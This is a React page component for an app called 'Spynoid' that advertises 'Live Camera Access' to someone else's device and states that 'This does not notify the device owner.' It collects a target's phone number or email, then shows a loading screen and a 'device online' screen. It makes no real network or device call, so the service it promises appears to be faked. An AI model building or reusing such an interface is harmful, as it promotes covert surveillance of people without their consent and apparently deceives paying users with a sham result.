import { useState } from "react";
import { Link2, Phone, Mail } from "lucide-react";
import CountrySelector from "@/components/CountrySelector";
import LoadingScreen from "@/components/LoadingScreen";
import DeviceOnlineScreen from "@/components/DeviceOnlineScreen";
import PrivacyPolicyModal from "@/components/PrivacyPolicyModal";
import { countries } from "@/data/countries";

type Screen = "form" | "loading" | "online";

const Index = () => {
  const [screen, setScreen] = useState<Screen>("form");
  const [contactMethod, setContactMethod] = useState<"phone" | "email">("phone");
  const [selectedCountry, setSelectedCountry] = useState(countries[0]);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [email, setEmail] = useState("");
  const [showPrivacyPolicy, setShowPrivacyPolicy] = useState(false);

  const formatUSCANumber = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 3) {
      return numbers;
    }
    if (numbers.length <= 6) {
      return `(${numbers.slice(0, 3)}) ${numbers.slice(3)}`;
    }
    return `(${numbers.slice(0, 3)}) ${numbers.slice(3, 6)}-${numbers.slice(6, 10)}`;
  };

  const handlePhoneChange = (value: string) => {
    // Permite doar numere
    const numbers = value.replace(/\D/g, '');
    
    if (selectedCountry.prefix === "+1") {
      if (numbers.length <= 10) {
        setPhoneNumber(numbers);
      }
    } else {
      setPhoneNumber(numbers);
    }
  };

  const displayPhoneNumber = selectedCountry.prefix === "+1" 
    ? formatUSCANumber(phoneNumber)
    : phoneNumber;

  const isFormValid = contactMethod === "phone" 
    ? phoneNumber.length >= 3 
    : email.length >= 3;

  const handleContinue = () => {
    if (!isFormValid) return;
    setScreen("loading");
  };

  if (screen === "loading") {
    return <LoadingScreen onComplete={() => setScreen("online")} />;
  }

  if (screen === "online") {
    return <DeviceOnlineScreen onClose={() => setScreen("form")} />;
  }

  return (
    <>
      <PrivacyPolicyModal 
        isOpen={showPrivacyPolicy} 
        onClose={() => setShowPrivacyPolicy(false)} 
      />
      
      <div className="fixed inset-0 bg-background flex flex-col overflow-hidden">
        <div className="absolute top-4 left-4 z-10">
          <h1 className="text-base font-medium text-foreground">Spynoid</h1>
        </div>
        
        <div className="flex-1 flex items-center justify-center px-4 overflow-y-auto">
          <div className="w-full max-w-md py-8">
            <div className="flex flex-col items-center space-y-5">
              <div className="w-20 h-20 rounded-full bg-gradient-to-br from-cyan-400 to-emerald-500 flex items-center justify-center">
                <Link2 className="w-8 h-8 text-white" strokeWidth={3} />
              </div>

              <div className="text-center space-y-1.5">
                <h2 className="text-xl font-semibold text-foreground">Live Camera Access</h2>
                <p className="text-[hsl(var(--subtitle))] text-xs">
                  This does not notify the device owner.
                </p>
              </div>

              <div className="flex gap-2 w-full max-w-[280px]">
                <button
                  onClick={() => setContactMethod("phone")}
                  className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-4 rounded-full text-xs font-semibold transition-all ${
                    contactMethod === "phone"
                      ? "bg-primary text-primary-foreground"
                      : "bg-secondary text-secondary-foreground"
                  }`}
                >
                  <Phone className="w-3.5 h-3.5" />
                  Phone
                </button>
                <button
                  onClick={() => setContactMethod("email")}
                  className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-4 rounded-full text-xs font-semibold transition-all ${
                    contactMethod === "email"
                      ? "bg-primary text-primary-foreground"
                      : "bg-secondary text-secondary-foreground"
                  }`}
                >
                  <Mail className="w-3.5 h-3.5" />
                  Email
                </button>
              </div>

              <div className="w-full space-y-3">
                {contactMethod === "phone" ? (
                  <>
                    <CountrySelector
                      selectedCountry={selectedCountry}
                      onSelect={setSelectedCountry}
                    />
                    <div className="relative">
                      <span className="absolute left-5 top-1/2 -translate-y-1/2 text-muted-foreground text-base">
                        {selectedCountry.prefix}
                      </span>
                      <input
                        type="tel"
                        value={displayPhoneNumber}
                        onChange={(e) => handlePhoneChange(e.target.value)}
                        placeholder={selectedCountry.prefix === "+1" ? "(123) 456-7890" : "123456789"}
                        className="w-full pl-16 pr-5 py-3 bg-input rounded-2xl text-base text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                      />
                    </div>
                  </>
                ) : (
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="apple@icloud.com"
                    className="w-full px-5 py-3 bg-input rounded-2xl text-base text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                  />
                )}

                <button
                  onClick={handleContinue}
                  disabled={!isFormValid}
                  className={`w-full py-3 rounded-2xl text-sm font-medium transition-colors ${
                    isFormValid
                      ? "bg-primary text-primary-foreground hover:bg-primary/90"
                      : "bg-secondary text-secondary-foreground cursor-not-allowed"
                  }`}
                >
                  Continue
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Privacy Policy Link */}
        <div className="absolute bottom-6 left-0 right-0 flex justify-center">
          <button
            onClick={() => setShowPrivacyPolicy(true)}
            className="text-blue-500 text-xs font-normal hover:underline"
          >
            Privacy Policy
          </button>
        </div>
      </div>
    </>
  );
};

export default Index;
